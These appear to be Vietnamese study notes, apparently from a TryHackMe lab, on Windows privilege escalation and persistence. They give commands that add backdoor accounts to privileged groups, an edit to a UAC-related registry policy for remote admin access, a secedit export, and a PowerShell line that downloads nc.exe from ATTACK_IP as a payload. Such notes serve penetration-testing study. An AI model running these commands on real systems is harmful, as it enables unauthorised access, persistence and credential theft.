### **Privilege Escalation trên Windows**

#### **Đặc điểm chung**

- Privilege Escalation trên Windows thường khai thác các lỗ hổng cấu hình sai, dịch vụ không được vá, hoặc quyền truy cập không được quản lý chặt chẽ để nâng cấp từ tài khoản người dùng thông thường lên quyền **Administrator** hoặc **SYSTEM**.
- Mục tiêu: Đạt được quyền kiểm soát cao nhất (SYSTEM) để thực thi mã độc, truy cập dữ liệu nhạy cảm, hoặc duy trì quyền truy cập lâu dài.

#### **Các điểm cần chú ý**

1. **Khai thác cấu hình sai (Misconfiguration):**
    - **Dịch vụ chạy với quyền SYSTEM:** Kiểm tra các dịch vụ có quyền cao nhưng cấu hình yếu (ví dụ: dịch vụ cho phép ghi tệp thực thi).
    - **Quyền quản lý tệp/thư mục:** Tìm các thư mục hệ thống (như C:\Windows\Temp) có quyền ghi cho người dùng không đủ đặc quyền.
    - **Đường dẫn tìm kiếm PATH không an toàn:** Nếu biến PATH chứa thư mục mà người dùng có quyền ghi, có thể chèn tệp thực thi giả mạo.
2. **Khai thác lỗ hổng hệ thống:**
    - **Lỗ hổng kernel:** Sử dụng các exploit như EternalBlue, PrintNightmare để nâng quyền.
    - **UAC bypass:** Kỹ thuật bỏ qua User Account Control để chạy lệnh với quyền cao mà không cần xác nhận.
    - **DLL Hijacking:** Chèn DLL độc hại vào ứng dụng chạy với quyền cao.
3. **Thông tin xác thực (Credentials):**
    - **Trích xuất mật khẩu:** Sử dụng công cụ như Mimikatz để lấy mật khẩu từ bộ nhớ (LSASS), SAM, hoặc tệp đăng nhập.
    - **Token impersonation:** Lợi dụng các token của tài khoản có quyền cao để giả mạo danh tính.
    - **Lấy thông tin từ Registry:** Kiểm tra khóa Registry (như HKLM\Software) chứa mật khẩu hoặc thông tin nhạy cảm.
4. **Công cụ phổ biến:**
    - **Mimikatz:** Trích xuất thông tin xác thực.
    - **PowerSploit/PowerUp:** Tự động hóa kiểm tra cấu hình sai.
    - **Metasploit:** Khai thác lỗ hổng nâng quyền.
5. **Phòng chống:**
    - Cập nhật bản vá hệ thống định kỳ.
    - Áp dụng nguyên tắc ít đặc quyền (Least Privilege).
    - Giám sát hoạt động bất thường (Process Monitor, Event Viewer).
    - Vô hiệu hóa tài khoản không cần thiết và giới hạn quyền SYSTEM.

### Gán Thành viên Nhóm

Để nâng quyền cho tài khoản không có đặc quyền, bạn có thể thực hiện các bước sau:

1. **Thêm tài khoản vào nhóm Administrators**:
   ```cmd
   C:\> net localgroup administrators thmuser0 /add
   ```
   Lệnh này cấp quyền quản trị cho tài khoản `thmuser0`, cho phép truy cập máy chủ qua RDP, WinRM hoặc các dịch vụ quản trị từ xa khác.

2. **Thêm tài khoản vào nhóm Backup Operators** (ít bị nghi ngờ hơn):
   ```cmd
   C:\> net localgroup "Backup Operators" thmuser1 /add
   ```
   Tài khoản trong nhóm này không có quyền quản trị nhưng có thể đọc/ghi bất kỳ tệp hoặc khóa registry nào, bất kể DACL. Điều này cho phép sao chép nội dung của SAM và SYSTEM registry hives để khôi phục hash mật khẩu của tất cả người dùng, từ đó dễ dàng nâng quyền lên tài khoản quản trị.

3. **Thêm tài khoản vào nhóm Remote Management Users để sử dụng WinRM**:
   ```cmd
   C:\> net localgroup "Remote Management Users" thmuser1 /add
   ```
   Lệnh này cho phép tài khoản `thmuser1` truy cập từ xa qua WinRM, vì tài khoản không có đặc quyền không thể sử dụng RDP hoặc WinRM nếu không được thêm vào nhóm này.

### Vô hiệu hóa LocalAccountTokenFilterPolicy để khôi phục quyền quản trị

Do cơ chế User Account Control (UAC), tính năng LocalAccountTokenFilterPolicy sẽ loại bỏ quyền quản trị của tài khoản cục bộ khi đăng nhập từ xa. Khi sử dụng WinRM, bạn chỉ nhận được token truy cập hạn chế, không có quyền quản trị.

Để khôi phục quyền quản trị, bạn cần vô hiệu hóa LocalAccountTokenFilterPolicy bằng cách thay đổi khóa registry sau:

```cmd
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Lệnh này đặt giá trị `LocalAccountTokenFilterPolicy` thành 1, cho phép tài khoản cục bộ giữ quyền quản trị khi đăng nhập từ xa qua WinRM.

### Gán Đặc quyền và Bộ mô tả Bảo mật

Để đạt được kết quả tương tự như việc thêm người dùng vào nhóm Backup Operators mà không cần sửa đổi thành viên nhóm, bạn có thể gán đặc quyền đặc biệt trực tiếp cho người dùng. Đặc quyền là khả năng thực hiện một tác vụ trên hệ thống, từ việc đơn giản như tắt máy chủ đến các hoạt động đặc quyền cao như chiếm quyền sở hữu bất kỳ tệp nào.

Nhóm Backup Operators được gán mặc định hai đặc quyền sau:

- **SeBackupPrivilege**: Cho phép người dùng đọc bất kỳ tệp nào trên hệ thống, bỏ qua DACL.
- **SeRestorePrivilege**: Cho phép người dùng ghi bất kỳ tệp nào trên hệ thống, bỏ qua DACL.

Để gán các đặc quyền này cho một người dùng mà không cần thay đổi thành viên nhóm, bạn có thể sử dụng lệnh `secedit`. Đầu tiên, xuất cấu hình hiện tại vào một tệp tạm thời:

```cmd
secedit /export /cfg config.inf
```

Lệnh này xuất cấu hình bảo mật hiện tại vào tệp `config.inf` để chỉnh sửa hoặc sử dụng tiếp theo.

### Tải tệp payload qua PowerShell

Lệnh PowerShell sau tải tệp thực thi từ máy chủ từ xa và lưu vào máy mục tiêu:

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://ATTACK_IP/nc.exe', 'payload.exe')
```

Lệnh này sử dụng `System.Net.WebClient` để tải tệp `nc.exe` từ địa chỉ `http://ATTACK_IP` và lưu thành `payload.exe` trên hệ thống mục tiêu, hỗ trợ triển khai payload trong tấn công mạng.


